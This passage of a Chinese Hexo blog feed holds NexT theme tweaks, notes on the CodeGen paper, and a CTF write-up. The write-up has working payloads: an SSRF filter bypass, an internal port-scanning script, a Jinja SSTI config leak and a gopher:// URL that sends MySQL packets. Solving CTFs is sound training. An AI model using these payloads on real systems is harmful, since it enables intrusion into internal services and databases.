class="string">&quot;busuanzi_container_site_pv&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">      &lt;span class=&quot;post-meta-item-icon&quot;&gt;</span></span><br><span class="line"><span class="comment">        &lt;i class=&quot;fa fa-&#123;&#123; theme.busuanzi_count.total_views_icon &#125;&#125;&quot;&gt;&lt;/i&gt;</span></span><br><span class="line"><span class="comment">      &lt;/span&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;site-pv&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&#123;&#123; __(&#x27;footer.total_views&#x27;) &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_value_site_pv&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      条鱼</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;%- endif %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="宽度更改">宽度更改</h2>
<p>路径
**themes/Next/source/css/_variables/Pisces.styl<strong>，</strong>14**行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$content-desktop-largest      = 90%;</span><br></pre></td></tr></table></figure>
<h2 id="站点地图-1">站点地图</h2>
<p>百度站点地图有点麻烦，不知道为啥 <strong>CNAME</strong> 过不了，在
**themes/Next/layout/_partials/head/head.swig**
中加入如下代码去验证。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;baidu-site-verification&quot;</span> <span class="attr">content</span>=<span class="string">&quot;5ZQsOe30cm&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="背景">背景</h2>
<p>这里开始需要修改<strong>css</strong>样式，因此引入自己的样式文件，方便修正。</p>
<p>打开
**themes/Next/_config.yml<strong>，</strong>custom_file_path**。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.swig</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.swig</span></span><br><span class="line">  <span class="comment">#sidebar: source/_data/sidebar.swig</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.swig</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.swig</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.swig</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.swig</span></span><br><span class="line">  <span class="comment">#variable: source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">themes/Next/source/css/_data/styles</span></span><br></pre></td></tr></table></figure>
<p>然后创建样式文件，路径 **themes/Next/source/css/_data/styles**。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&quot;/images/bg.jpeg&quot;</span>);</span><br><span class="line">  <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (hexo-config(&#x27;disqusjs<span class="selector-class">.enable</span>&#x27;) and hexo-config(&#x27;darkmode&#x27;)) &#123;</span><br><span class="line">  <span class="keyword">@media</span> (<span class="attribute">prefers-color-scheme</span>:dark) &#123;</span><br><span class="line">    <span class="selector-tag">body</span> &#123;</span><br><span class="line">      <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">5</span>), <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">5</span>)), <span class="built_in">url</span>(<span class="string">&quot;/images/bg.jpeg&quot;</span>);</span><br><span class="line">      <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">      <span class="attribute">background-size</span>: cover;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="透明度样式">透明度样式</h2>
<p>一个简单些，但是会直接改变文章内容的透明度，增加如下。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.post-block</span>, <span class="selector-class">.header-inner</span>,</span><br><span class="line"><span class="selector-class">.use-motion</span> <span class="selector-class">.post-block</span>, <span class="selector-class">.use-motion</span> <span class="selector-class">.pagination</span>, <span class="selector-class">.use-motion</span>, <span class="selector-class">.comments</span>, <span class="selector-class">.column</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">opacity</span>: .<span class="number">95</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="老婆">老婆</h2>
<p>我采用的是部署在自己 <strong>Github</strong> 上的方式。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/stevenjoezhang/live2d-widget.git themes/Next/source/live2d-widget</span><br></pre></td></tr></table></figure>
<p>**themes/Next/layout/_partials/footer.swig<strong>，</strong>14**
行。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;copyright&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-3.4.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/live2d-widget/autoload.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>themes/Next/source/live2d-widget/autoload.js</strong>，启用自己的路径。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注意：live2d_path 参数应使用绝对路径</span></span><br><span class="line"><span class="comment">// const live2d_path = &quot;https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/&quot;;</span></span><br><span class="line"><span class="keyword">const</span> live2d_path = <span class="string">&quot;/live2d-widget/&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>路径在<strong>public/live2d-widget/waifu-tips.js</strong>，<strong>160</strong>
行左右。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (modelId === <span class="literal">null</span>) &#123;</span><br><span class="line">  <span class="comment">// 首次访问加载 指定模型 的 指定材质</span></span><br><span class="line">  modelId = <span class="number">1</span>; <span class="comment">// 模型 ID</span></span><br><span class="line">  modelTexturesId = <span class="number">50</span>; <span class="comment">// 材质 ID</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>themes/Next/source/live2d-widget/waifu.css</strong>，<strong>24</strong>
行，注释 <strong>left</strong>，添加 <strong>right</strong>。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#waifu</span> &#123;</span><br><span class="line">    <span class="attribute">bottom</span>: -<span class="number">1000px</span>;</span><br><span class="line">    <span class="comment">/* left: 0; */</span></span><br><span class="line">    <span class="attribute">right</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">3px</span>);</span><br><span class="line">    <span class="attribute">transition</span>: transform .<span class="number">3s</span> ease-in-out, bottom <span class="number">3s</span> ease-in-out;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="搜索">搜索</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
<p>然后 <strong>759</strong> 行左右。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>在博客的 **_config.yml**中。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搜索</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">content:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br></pre></td></tr></table></figure>
<h1 id="refer">Refer</h1>
<p><a href="https://segmentfault.com/a/1190000005723321">阿里云
<strong>VPS</strong> 搭建自己的的 <strong>Hexo</strong> 博客</a></p>
<p><a
href="https://blog.csdn.net/Captain_Magicer/article/details/49073873?utm_source=blogxgwz8"><strong>Hexo</strong>
博客主题 <strong>NexT</strong> 使用自定义的 <strong>CSS</strong>
样式</a></p>
<p><strong><a
href="https://github.com/EYHN/hexo-helper-live2d">hexo-helper-live2d</a></strong></p>
]]></content>
      <categories>
        <category>配置</category>
      </categories>
      <tags>
        <tag>HEXO</tag>
      </tags>
  </entry>
  <entry>
    <title>关于某CTF交流群的入群题</title>
    <url>/Daily-CTF-Group-Question-4/</url>
    <content><![CDATA[<p>关于某<strong>CTF</strong>交流群的入群题<strong>Orz</strong>。</p>
<p>换新题了，可以发了。</p>
<span id="more"></span>
<p><strong>Emmm</strong>直接上题。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>); </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>); </span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123; </span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造<strong>/?url=http://<span class="citation"
data-cites="127.0.0.1">@127.0.0.1</span>.:80/flag.php</strong>可以绕过，提示<strong>string(15)
"172.11.243.0/24"</strong>，应该是要扫内网。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line">threads_count = <span class="number">10</span></span><br><span class="line">que = Queue.Queue()</span><br><span class="line">threads = []</span><br><span class="line">lock = threading.Lock()</span><br><span class="line">ports = [<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">69</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">110</span>,<span class="number">389</span>,<span class="number">389</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">488</span>,<span class="number">512</span>,<span class="number">513</span>,<span class="number">514</span>,<span class="number">873</span>,<span class="number">901</span>,<span class="number">1043</span>,<span class="number">1080</span>,<span class="number">1099</span>,<span class="number">1090</span>,<span class="number">1158</span>,<span class="number">1352</span>,<span class="number">1433</span>,</span><br><span class="line">         <span class="number">1434</span>,<span class="number">1521</span>,<span class="number">2049</span>,<span class="number">2100</span>,<span class="number">2181</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">3306</span>,<span class="number">3307</span>,<span class="number">3389</span>,<span class="number">4440</span>,<span class="number">4444</span>,<span class="number">4445</span>,<span class="number">4848</span>,<span class="number">5000</span>,<span class="number">5280</span>,<span class="number">5432</span>,<span class="number">5500</span>,<span class="number">5632</span>,<span class="number">5900</span>,<span class="number">5901</span>,</span><br><span class="line">         <span class="number">5902</span>,<span class="number">5903</span>,<span class="number">5984</span>,<span class="number">6000</span>,<span class="number">6033</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">6666</span>,<span class="number">7001</span>,<span class="number">7001</span>,<span class="number">7002</span>,<span class="number">7070</span>,<span class="number">7101</span>,<span class="number">7676</span>,<span class="number">7777</span>,<span class="number">7899</span>,<span class="number">7988</span>,<span class="number">8000</span>,<span class="number">8001</span>,<span class="number">8002</span>,<span class="number">8003</span>,<span class="number">8004</span>,</span><br><span class="line">         <span class="number">8005</span>,<span class="number">8006</span>,<span class="number">8007</span>,<span class="number">8008</span>,<span class="number">8009</span>,<span class="number">8069</span>,<span class="number">8080</span>,<span class="number">8081</span>,<span class="number">8082</span>,<span class="number">8083</span>,<span class="number">8084</span>,<span class="number">8085</span>,<span class="number">8086</span>,<span class="number">8087</span>,<span class="number">8088</span>,<span class="number">8089</span>,<span class="number">8090</span>,<span class="number">8091</span>,<span class="number">8092</span>,<span class="number">8093</span>,<span class="number">8094</span>,<span class="number">8095</span>,</span><br><span class="line">         <span class="number">8098</span>,<span class="number">8099</span>,<span class="number">8980</span>,<span class="number">8990</span>,<span class="number">8443</span>,<span class="number">8686</span>,<span class="number">8787</span>,<span class="number">8880</span>,<span class="number">8888</span>,<span class="number">9000</span>,<span class="number">9001</span>,<span class="number">9043</span>,<span class="number">9045</span>,<span class="number">9060</span>,<span class="number">9080</span>,<span class="number">9081</span>,<span class="number">9088</span>,<span class="number">9088</span>,<span class="number">9090</span>,<span class="number">9091</span>,<span class="number">9100</span>,<span class="number">9200</span>,</span><br><span class="line">         <span class="number">9300</span>,<span class="number">9443</span>,<span class="number">9871</span>,<span class="number">9999</span>,<span class="number">10000</span>,<span class="number">10068</span>,<span class="number">10086</span>,<span class="number">11211</span>,<span class="number">20000</span>,<span class="number">22022</span>,<span class="number">22222</span>,<span class="number">27017</span>,<span class="number">28017</span>,<span class="number">50060</span>,<span class="number">50070</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">    que.put(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">while</span> que.qsize() &gt; <span class="number">0</span>:</span><br><span class="line">        num = que.get()</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                addr = <span class="string">&quot;172.11.243.&#123;num&#125;:&#123;port&#125;&quot;</span>.<span class="built_in">format</span>(num = num, port = port)</span><br><span class="line">                <span class="built_in">print</span> addr</span><br><span class="line">                url = <span class="string">&quot;http://ctf473831530.yulige.top:12345/?url=http://&quot;</span> + addr</span><br><span class="line">                r = requests.get(url, timeout = <span class="number">2.8</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;bool(false)&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">print</span> addr + <span class="string">&quot; is Open&quot;</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                lock.acquire()</span><br><span class="line">                lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads_count):</span><br><span class="line">    t = threading.Thread(target = run)</span><br><span class="line">    threads.append(t)</span><br><span class="line">    t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> que.qsize() &gt; <span class="number">0</span>:</span><br><span class="line">    time.sleep(<span class="number">1.0</span>)</span><br></pre></td></tr></table></figure>
<p>然后扫到了<strong>172.11.243.81:8080</strong>，访问得到如下代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;HINT&#x27;</span>] = os.environ.pop(<span class="string">&#x27;HINT&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/yulige/&lt;path:yulige&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">yulige</span>(<span class="params">yulige</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist])+s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(yulige))</span><br><span class="line">    &#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
<p>根据提示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://172.11.243.81:8080/yulige/&#123;&#123;get_flashed_messages.globals[%27current_app%27].config[%27HINT%27]&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>然后得到提示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string(29) &quot;mysql_user_is_yuligeeee123321&quot;</span><br></pre></td></tr></table></figure>
<p>看来是需要使用<strong>Gopher</strong>协议对数据库进行操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ctf473831530.yulige.top:12345/?url=gopher://localhost:80@172.11.243.218:3306/_%25b3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2579%2575%256c%2569%2567%2565%2565%2565%2565%2531%2532%2533%2533%2532%2531%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%256b%2503%255f%256f%2573%250a%256d%2561%2563%256f%2573%2531%2530%252e%2531%2534%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2535%2530%2536%2531%2534%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2535%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2521%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2540%2540%2576%2565%2572%2573%2569%256f%256e%255f%2563%256f%256d%256d%2565%256e%2574%2520%256c%2569%256d%2569%2574%2520%2531%2512%2500%2500%2500%2503%2553%2545%254c%2545%2543%2554%2520%2544%2541%2554%2541%2542%2541%2553%2545%2528%2529%250c%2500%2500%2500%2502%2566%256c%2561%2534%2534%2534%2531%2531%2531%2531%2567%250f%2500%2500%2500%2503%2573%2568%256f%2577%2520%2564%2561%2574%2561%2562%2561%2573%2565%2573%250c%2500%2500%2500%2503%2573%2568%256f%2577%2520%2574%2561%2562%256c%2565%2573%251d%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2546%2531%2531%2531%2531%256c%256c%256c%256c%2567%2567%2567%2567%2567%2501%2500%2500%2500%2501</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>SSRF</tag>
        <tag>SSTI</tag>
        <tag>GOPHER</tag>
      </tags>
  </entry>
  <entry>
    <title>论文 CodeGen： An Open Large Language Model for Code with Multi-Turn Program Synthesis</title>
    <url>/Paper-An-Open-Large-Language-Model-for-Code-with-Multi-Turn-Program-Synthesis/</url>
    <content><![CDATA[<p>代码仓库：https://github.com/salesforce/CodeGen</p>
<p>感觉全文都在说的就是多轮交互生成代码。</p>
<p>大篇幅描写的内容都是他自创的评估方法。</p>
<p>考个公吧要不。</p>
<span id="more"></span>
<h1 id="introduction">Introduction</h1>
<p>两个挑战：</p>
<ul>
<li>搜索空间的棘手性</li>
<li>难以正确理解用户意图</li>
</ul>
<p>提出了一种多轮代码生成方法，用户与合成系统进行交流的时候，使用自然语言逐步提供规范，同时接收来自系统以合成子程序的形式作出的响应，这样，用户与系统就可以分多个步骤完成程序。</p>
<ul>
<li>把复杂方法拆解成多个简单步骤</li>
<li>利用生成带有注释的代码，反过来增强模型在多轮迭代中的代码生成能力，但这需要大量的数据规模</li>
</ul>
<p>模型通过多步自然语言的描述来生成代码。如图
1，其中展示了模型如何生成一段以提取电子邮件地址的用户名。</p>
<p>基准的表现通过专家编写的测试用例的通过率来衡量。</p>
<figure>
<img
src="/images/Paper-An-Open-Large-Language-Model-for-Code-with-Multi-Turn-Program-Synthesis/image-20240830151454222.png"
alt="Figure 1" />
<figcaption aria-hidden="true">Figure 1</figcaption>
</figure>
<h1 id="model-training">Model Training</h1>
<p>评估多轮编程能力在模型规模扩展下的表现【说实话我没懂什么是 scaling
laws，随着模型参数数量和训练数据规模的增加？】。</p>
<p>采用了基于标准 Transformer
架构的自回归语言模型，调整了两个关键变量：</p>
<ul>
<li>模型参数数量</li>
<li>训练语料中的编程语言标记数量</li>
</ul>
<p>为了支持这些大规模模型的训练，作者开发了一个名为 <a
href="https://github.com/salesforce/jaxformer">JAXFORMER</a>
的定制库，该库专门用于 TPU-v4 硬件。</p>
<h2 id="datasets">Datasets</h2>
<ul>
<li>THEPILE</li>
<li>BIGQUERY</li>
<li>BIGPYTHON</li>
</ul>
<h2 id="models">Models</h2>
<p>模型在数据集上的训练顺序如上排序。</p>
<p>作者发现，尽管没有针对注释和代码进行训练，但模型依然可以认清二者的关系，他们称这个现象为
“Emergence”，其不仅限于代码生成，也出现在许多自然语言处理任务中。</p>
<p>一些大规模的无监督语言模型可以在零样本的情况下，仅凭对大量数据的训练，就能解决以前从未见过的任务（zero-shot
generalization）。</p>
<h1 id="single-turn-evalution">Single-Turn Evalution</h1>
<p>作者首先使用现有的代码生成基准测试 HumanEval（MIT许可）来评估 CODEGEN
模型。</p>
<blockquote>
<p>HumanEval 包含 164 个手写的 Python 编程问题。</p>
<p>每个问题提供了一个包含函数生成描述、函数签名以及以断言形式给出的示例测试用例的提示。</p>
<p>模型需要根据提示完成一个函数，使其能够通过所有提供的测试用例，从而通过功能正确性来衡量性能。</p>
</blockquote>
<p>由于用户意图在单个提示中指定，并且仅提供给模型一次，因此将 HumanEval
的评估视为单轮评估，以区别于下一节中介绍的多轮评估。</p>
<p>作者使用了核采样（<a
href="https://openreview.net/forum?id=rygGQyrFvH">Holtzman</a>
等人，2020）的方法，并设置 top-p 参数为 0.95。</p>
<h2
id="humaneval-performance-scales-as-a-function-of-model-size-and-data-size">HUMANEVAL
PERFORMANCE SCALES AS A FUNCTION OF MODEL SIZE AND DATA SIZE</h2>
<p>将模型与 Codex 模型（Chen et al., 2021）进行比较，后者在 HumanEval
基准测试中展示了最先进的性能。</p>
<p>Python 程序生成能力会随着 Python
训练数据量的增加而增强。几乎所有的模型，其规模的增加都会提升整体性能。</p>
<p>最大模型 CODEGEN-MONO 16.1B 的性能具有竞争力，并根据 k
的取值在某些情况下超越 Codex。</p>
<h2
